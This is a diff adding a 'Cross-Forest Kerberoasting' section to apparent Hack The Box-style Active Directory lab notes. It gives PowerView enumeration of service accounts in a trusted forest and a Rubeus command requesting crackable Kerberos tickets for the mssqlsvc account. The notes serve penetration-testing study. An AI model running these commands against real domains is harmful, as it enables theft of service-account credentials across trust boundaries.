@@ -160,3 +160,22 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 ```
 
 # Cross-Forest Trust Abuse
+
+## Cross-Forest Kerberoasting
+**Case:** `FREIGHTLOGISTICS.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `INLANEFREIGHT.LOCAL` 
+
+### Windows 
+
+```powershell
+# Enumerating Accounts for Associated SPNs
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+# Enumerating the mssqlsvc Account
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
+
+```
+```
